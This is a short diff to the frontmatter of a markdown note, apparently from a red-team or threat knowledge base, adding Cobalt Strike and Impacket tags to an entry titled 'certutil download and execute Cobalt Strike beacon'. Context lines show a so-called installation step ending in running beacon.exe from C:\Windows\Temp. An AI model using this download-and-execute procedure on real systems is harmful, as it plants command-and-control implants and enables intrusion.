@@ -17,6 +17,9 @@ output: '# Installation instructtions for the tool
   & C:\Windows\Temp\beacon.exe'
 created_at: '2023-05-25T18:50:44.625465+00:00'
 updated_at: '2023-05-25T18:50:44.779119+00:00'
+tools:
+- '[[Cobalt Strike]]'
+- '[[Impacket]]'
 ---
 
 # Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon
